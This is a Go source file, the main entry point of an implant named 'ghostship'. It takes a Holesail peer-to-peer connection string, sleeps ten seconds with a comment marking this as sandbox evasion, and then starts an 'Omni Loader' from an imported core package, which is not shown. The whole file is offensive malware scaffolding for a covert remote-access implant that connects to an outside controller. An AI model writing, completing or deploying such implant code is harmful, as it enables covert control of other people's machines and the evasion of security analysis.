package main

import (
	"flag"
	"fmt"
	"os"
	"time"

	"ghostship/implant/core"
)

func main() {
	connString := flag.String("connect", "", "Holesail connection string (hs://...)")
	flag.Parse()

	if *connString == "" {
		fmt.Println("Usage: ghostship --connect hs://<key>")
		os.Exit(1)
	}

	// 1. Initial Delay for Sandbox Evasion
	time.Sleep(10 * time.Second)

	// 2. Start Omni Loader
	if err := core.Run(*connString); err != nil {
		fmt.Printf("[!] Fatal Error: %v\n", err)
		os.Exit(1)
	}
}
